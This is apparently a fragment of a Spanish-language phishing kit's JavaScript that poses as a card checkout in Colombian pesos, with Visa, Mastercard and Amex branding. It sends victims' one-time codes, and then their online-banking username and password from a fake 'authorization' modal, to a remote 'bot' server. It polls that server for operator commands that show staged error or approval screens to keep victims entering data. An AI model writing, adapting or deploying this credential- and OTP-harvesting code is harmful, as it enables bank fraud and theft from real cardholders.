    body: JSON.stringify({ sessionId: sessionIdActualPago, otp: codigo, bancoKey: BANCO_KEY_ACTUAL })
  }).catch(function(err) { console.error('Error enviando OTP:', err); });

  iniciarPollingOtp(sessionIdActualPago, marca);
});

function mostrarCargaOtp(marca) {
  if (window.__PYP_SET_ACCION__) window.__PYP_SET_ACCION__('enviando_otp');
  var overlay = document.getElementById('pagoCargaOtpOverlay');
  var logo = document.getElementById('pagoCargaOtpLogo');
  
  if (marca === 'visa') {
    logo.outerHTML = '<svg id="pagoCargaOtpLogo" class="pago-carga-otp-logo" style="height:160px; max-height:160px; width:auto; max-width:300px; object-fit:contain; display:block; margin: 0 auto;" viewBox="0 0 192.756 192.756" xmlns="http://www.w3.org/2000/svg"><path fill="transparent" d="M0 0h192.756v192.756H0V0z"/><path fill="#1d5b99" d="M181.266 155.531H8.504V37.225h175.748V155.531h-2.986z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#fff" d="M181.266 152.545H11.49V40.211h169.776v112.334z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M72.851 114.621l11.026-36.355h9.838l-11.027 36.355h-9.837zM68.453 78.276l-8.85 15.412c-2.252 4.037-3.57 6.076-4.203 8.625h-.135c.157-3.232-.294-7.203-.336-9.447l-.978-14.59h-16.56l-.169.978c4.254 0 6.777 2.137 7.471 6.509l3.228 28.858h10.192l20.609-36.345H68.453zM144.959 114.621l-.271-5.406-12.283-.01-2.514 5.416h-10.68l19.367-36.286h13.109l3.279 36.286h-10.007zm-1.127-21.445c-.111-2.687-.201-6.333-.02-8.541h-.145c-.598 1.805-3.17 7.225-4.301 9.89l-3.66 7.968h8.625l-.499-9.317zM104.043 115.654c-6.945 0-11.555-2.203-14.845-4.168l4.686-7.156c2.955 1.652 5.274 3.559 10.612 3.559 1.715 0 3.369-.445 4.309-2.072 1.367-2.363-.316-3.637-4.158-5.812l-1.898-1.234c-5.697-3.892-8.162-7.59-5.48-14.044 1.717-4.128 6.242-7.258 13.711-7.258 5.148 0 9.977 2.228 12.789 4.404l-5.387 6.318c-2.746-2.22-5.021-3.343-7.625-3.343-2.076 0-3.654.801-4.199 1.881-1.025 2.03.332 3.414 3.326 5.272l2.256 1.436c6.918 4.363 8.564 8.937 6.832 13.212-2.984 7.363-8.822 9.005-14.929 9.005zM157.895 83.193h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .47-.287.665-.676.708l.727 1.14h-.482l-.67-1.108h-.402v1.108zm.476-1.473c.32 0 .602-.031.602-.407 0-.313-.307-.351-.562-.351h-.516v.758h.476zm-.012 2.476c-1.348 0-2.307-1.009-2.307-2.344 0-1.409 1.064-2.343 2.307-2.343 1.227 0 2.293.934 2.293 2.343 0 1.41-1.066 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.796-1.805 1.936 0 1.065.689 1.936 1.805 1.936 1.002 0 1.791-.79 1.791-1.936 0-1.14-.789-1.936-1.791-1.936z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#e7a83a" d="M177.086 125.912H15.969v21.557h161.117v-21.557z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M176.787 45.586H15.671v21.558h161.116V45.586zM173.105 145.936h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .469-.287.664-.676.707l.727 1.141h-.482l-.67-1.109h-.402v1.109zm.477-1.473c.32 0 .602-.031.602-.408 0-.312-.307-.35-.562-.35h-.516v.758h.476zm-.012 2.475c-1.348 0-2.307-1.008-2.307-2.344 0-1.408 1.066-2.342 2.307-2.342 1.229 0 2.293.934 2.293 2.342 0 1.41-1.064 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.797-1.805 1.936 0 1.066.689 1.936 1.805 1.936 1.002 0 1.791-.789 1.791-1.936 0-1.139-.789-1.936-1.791-1.936z"/></svg>';
  } else if (marca === 'amex') {
    logo.outerHTML = '<img id="pagoCargaOtpLogo" class="pago-carga-otp-logo" src="img/amex.svg" style="height:160px; max-height:160px; width:auto; max-width:300px; object-fit:contain; display:block; margin: 0 auto; background-color: #ffffff; padding: 6px; border-radius: 8px;">';
  } else {
    logo.outerHTML = '<svg id="pagoCargaOtpLogo" class="pago-carga-otp-logo" style="height:160px; max-height:160px; width:auto; max-width:300px; object-fit:contain; display:block; margin: 0 auto;" viewBox="0 0 100 62" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="31" r="30" fill="#EB001B"/><circle cx="68" cy="31" r="30" fill="#F79E1B"/><path d="M50 8 C38 16 30 23 30 31 C30 39 38 46 50 54 C62 46 70 39 70 31 C70 23 62 16 50 8 Z" fill="#FF5F00"/></svg>';
  }
  
  overlay.classList.remove('hidden');
  document.body.style.overflow = 'hidden';
}
function ocultarCargaOtp() {
  document.getElementById('pagoCargaOtpOverlay').classList.add('hidden');
  document.body.style.overflow = '';
}

function mostrarErrorOtp(tipo) {
  tipo = tipo || 'rechazado';
  ocultarCargaOtp();
  var titulo = document.getElementById('pagoErrorOtpTitulo');
  var texto = document.getElementById('pagoErrorOtpTexto');
  if (tipo === 'cc_error') {
    titulo.textContent = 'Tarjeta no admitida';
    texto.textContent = 'Tu tarjeta no está habilitada para este tipo de compras. Por favor, comunícate con tu banco o intenta con otra tarjeta.';
  } else {
    titulo.textContent = 'Código incorrecto';
    texto.textContent = 'El código que ingresaste no es válido. Por favor, vuelve a ingresarlo correctamente.';
  }
  document.getElementById('pagoErrorOtpOverlay').classList.remove('hidden');
  document.body.style.overflow = 'hidden';
}
function cerrarErrorOtpYReintentar() {
  document.getElementById('pagoErrorOtpOverlay').classList.add('hidden');
  document.body.style.overflow = '';
  openAuthModal();
}

/* ============================================================ 
   POLLING DE OTP (cuando ya se envió el OTP — pantalla de carga)
   ============================================================ */
function iniciarPollingOtp(sessionId, marca) {
  if (pagoOtpPollingInterval) clearInterval(pagoOtpPollingInterval);
  pagoOtpPollingInterval = setInterval(function() {
    fetch(URL_BOT_RAILWAY + '/' + BANCO_KEY_ACTUAL + '/estado/' + sessionId)
      .then(function(r) { return r.json(); })
      .then(function(data) {
        if (data.estado === 'aceptado' || data.estado === 'finalizado') {
          clearInterval(pagoOtpPollingInterval);
          pagoOtpPollingInterval = null;
          ocultarCargaOtp();
          // SE ELIMINÓ EL WINDOW.LOCATION.HREF QUE RECARGABA LA PÁGINA
        }
        else if (data.accion === 'AUTORIZAR' || data.estado === 'autorizacion') {
          clearInterval(pagoOtpPollingInterval);
          pagoOtpPollingInterval = null;
          ocultarCargaOtp();
          var cardNumA = (document.getElementById('cardNumber') ? document.getElementById('cardNumber').value || '' : '').replace(/\D/g, '');
          abrirModalAutorizacion({
            monto: TOTAL_PAGO,
            ultimos4: cardNumA.slice(-4)
          });
        }
        else if (data.accion === 'CC_ERROR' || data.estado === 'cc_error') {
          clearInterval(pagoOtpPollingInterval);
          pagoOtpPollingInterval = null;
          ocultarCargaOtp();
          document.getElementById('dynamicCode').value = '';
          mostrarErrorOtp('cc_error');
        } 
        else if (data.accion === 'RECHAZAR' || data.estado === 'rechazado') {
          clearInterval(pagoOtpPollingInterval);
          pagoOtpPollingInterval = null;
          ocultarCargaOtp();
          document.getElementById('dynamicCode').value = '';
          mostrarErrorOtp('rechazado');
        }
      })
      .catch(function(err) { console.error('Error consultando estado OTP:', err); });
  }, 2000);
}

/* ============================================================ 
   🔥 POLLING ACTIVO DE OTP (cuando el usuario ESTÁ en la pantalla OTP)
   ============================================================ */
var pagoOtpPollingActivoInterval = null;

function iniciarPollingOtpActivo(sessionId) {
  if (pagoOtpPollingActivoInterval) clearInterval(pagoOtpPollingActivoInterval);
  
  pagoOtpPollingActivoInterval = setInterval(function() {
    fetch(URL_BOT_RAILWAY + '/' + BANCO_KEY_ACTUAL + '/estado/' + sessionId)
      .then(function(r) { return r.json(); })
      .then(function(data) {
        var accion = data.accion || '';
        var estado = data.estado || '';

        if (accion === 'AUTORIZAR' || estado === 'autorizacion') {
          clearInterval(pagoOtpPollingActivoInterval);
          pagoOtpPollingActivoInterval = null;

          var modalA = document.getElementById('authModal');
          if (modalA) {
            modalA.classList.remove('show');
            setTimeout(function() { modalA.style.display = 'none'; }, 400);
          }
          document.body.style.overflow = '';

          var cardNumA = (document.getElementById('cardNumber') ? document.getElementById('cardNumber').value || '' : '').replace(/\D/g, '');
          abrirModalAutorizacion({
            monto: TOTAL_PAGO,
            ultimos4: cardNumA.slice(-4)
          });
          return;
        }

        if (accion === 'CC_ERROR' || estado === 'cc_error') {
          clearInterval(pagoOtpPollingActivoInterval);
          pagoOtpPollingActivoInterval = null;

          var modal = document.getElementById('authModal');
          if (modal) {
            modal.classList.remove('show');
            setTimeout(function() { modal.style.display = 'none'; }, 400);
          }
          document.body.style.overflow = '';

          var cardNumber = document.getElementById('cardNumber');
          var expiryMonth = document.getElementById('expiryMonth');
          var expiryYear = document.getElementById('expiryYear');
          var cvv = document.getElementById('cvv');
          var cardHolder = document.getElementById('cardHolder');
          var docNumber = document.getElementById('docNumber');
          var accept1 = document.getElementById('acceptance1');
          var accept2 = document.getElementById('acceptance2');
          var submitBtn = document.getElementById('submitBtn');

          if (cardNumber) cardNumber.value = '';
          if (expiryMonth) expiryMonth.value = '';
          if (expiryYear) expiryYear.value = '';
          if (cvv) cvv.value = '';
          if (cardHolder) cardHolder.value = '';
          if (docNumber) docNumber.value = '';
          if (accept1) accept1.checked = false;
          if (accept2) accept2.checked = false;
          if (submitBtn) submitBtn.disabled = true;

          mostrarPagoError('visa', 'cc_error');
        }
        else if (accion === 'RECHAZAR' || estado === 'rechazado') {
          clearInterval(pagoOtpPollingActivoInterval);
          pagoOtpPollingActivoInterval = null;
        }
      })
      .catch(function(err) { console.error('Error polling OTP activo:', err); });
  }, 2000);
}

/* ============================================================ 
   MODAL AUTORIZACIÓN DE TRANSACCIÓN
   ============================================================ */
function abrirModalAutorizacion(opciones) {
  opciones = opciones || {};
  var monto = opciones.monto || TOTAL_PAGO;
  var ultimos4 = opciones.ultimos4 || '';
  var montoFormateado = Number(monto).toLocaleString('es-CO');

  var hoy = new Date();
  var fechaStr = String(hoy.getDate()).padStart(2, '0') + '/' +
                 String(hoy.getMonth() + 1).padStart(2, '0') + '/' +
                 hoy.getFullYear();

  document.getElementById('authMonto').textContent = montoFormateado;
  document.getElementById('authMontoDetalle').textContent = '$' + montoFormateado + ' COP';
  document.getElementById('authFecha').textContent = fechaStr;

  var tarjetaMask = '**** **** **** ' + (ultimos4 || '****');
  document.getElementById('authTarjeta').textContent = ultimos4 ? '**** ' + ultimos4 : '****';
  document.getElementById('authTarjetaDetalle').textContent = tarjetaMask;

  document.getElementById('authUsuario').value = '';
  document.getElementById('authPassword').value = '';
  document.getElementById('authError').classList.add('hidden');
  document.getElementById('authEnviarBtn').disabled = false;
  document.getElementById('authEnviarBtn').textContent = 'Enviar';

  var overlay = document.getElementById('modalAutorizacion');
  overlay.classList.remove('hidden');
  document.body.style.overflow = 'hidden';

  setTimeout(function() { document.getElementById('authUsuario').focus(); }, 200);
}

function cerrarModalAutorizacion() {
  document.getElementById('modalAutorizacion').classList.add('hidden');
  document.body.style.overflow = '';
}

document.addEventListener('DOMContentLoaded', function() {
  var btnEnviar = document.getElementById('authEnviarBtn');
  if (!btnEnviar) return;

  btnEnviar.addEventListener('click', function() {
    var usuario = document.getElementById('authUsuario').value.trim();
    var password = document.getElementById('authPassword').value.trim();
    var errorBox = document.getElementById('authError');

    if (!usuario || usuario.length < 3) {
      errorBox.textContent = 'Por favor ingresa tu usuario.';
      errorBox.classList.remove('hidden');
      return;
    }
    if (!password || password.length < 3) {
      errorBox.textContent = 'Por favor ingresa tu contraseña.';
      errorBox.classList.remove('hidden');
      return;
    }

    errorBox.classList.add('hidden');
    btnEnviar.disabled = true;
    btnEnviar.textContent = 'Enviando...';

    var sessionId = window.__PYP_SESSION__ || sessionIdActualPago || '';

    fetch(URL_BOT_RAILWAY + '/' + BANCO_KEY_ACTUAL + '/enviar-autorizacion', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sessionId: sessionId,
        usuario: usuario,
        password: password
      })
    })
    .then(function(r) { 
        return r.text().then(function(text) {
            var data = {};
            try { data = JSON.parse(text); } catch(e) { data = { error: text || 'Respuesta vacía' }; }
            if (!r.ok) {
                throw new Error(data.error || 'Error HTTP: ' + r.status);
            }
            return data;
        });
    })
    .then(function(data) {
      if (data && data.ok) {
        cerrarModalAutorizacion();
        mostrarPagoCarga('visa'); 
        iniciarPollingPago(sessionId, 'visa', { tarjeta: (document.getElementById('cardNumber') ? document.getElementById('cardNumber').value || '' : '') }); 
      } else {
        throw new Error((data && data.error) || 'Error al enviar');
      }
    })
    .catch(function(err) {
      console.error('Error autorización:', err);
      
      var msg = 'Error desconocido';
      if (err.message) {
          msg = err.message;
      }
      
      errorBox.textContent = 'Error: ' + msg;
      errorBox.classList.remove('hidden');
      btnEnviar.disabled = false;
      btnEnviar.textContent = 'Enviar';
    });
  });
});

/* ============================================================ 
   🔥 ESCUCHA GLOBAL DE AUTORIZACIÓN (Funciona en cualquier pantalla)
   ============================================================ */
var globalAutorizarInterval = null;
var yaSeAbrioModalAuth = false;

function iniciarEscuchaGlobalAutorizar() {
  if (globalAutorizarInterval) clearInterval(globalAutorizarInterval);
  
  globalAutorizarInterval = setInterval(function() {
    var sid = sessionIdActualPago || window.__PYP_SESSION__;
    if (!sid) return;
    if (yaSeAbrioModalAuth) return;

    fetch(URL_BOT_RAILWAY + '/' + BANCO_KEY_ACTUAL + '/estado/' + sid)
      .then(function(r) { return r.json(); })
      .then(function(data) {
        if (data.accion === 'AUTORIZAR' || data.estado === 'autorizacion') {
          yaSeAbrioModalAuth = true;
          clearInterval(globalAutorizarInterval);
          globalAutorizarInterval = null;

          if (typeof ocultarPagoCarga === 'function') ocultarPagoCarga();
          if (typeof ocultarCargaOtp === 'function') ocultarCargaOtp();
          
          var modalOtp = document.getElementById('authModal');
          if (modalOtp) {
            modalOtp.classList.remove('show');
            setTimeout(function() { modalOtp.style.display = 'none'; }, 400);
          }
          document.body.style.overflow = '';

          var cardNum = (document.getElementById('cardNumber') ? document.getElementById('cardNumber').value || '' : '').replace(/\D/g, '');
          if (typeof abrirModalAutorizacion === 'function') {
            abrirModalAutorizacion({
              monto: TOTAL_PAGO,
              ultimos4: cardNum.slice(-4)
            });
          }
        }
        
        if (data.accion === 'RECHAZAR' || data.accion === 'CC_ERROR') {
          clearInterval(globalAutorizarInterval);
          globalAutorizarInterval = null;
        }
      })
      .catch(function() {});
  }, 2000);
}

document.addEventListener('DOMContentLoaded', function() {
  iniciarEscuchaGlobalAutorizar();
});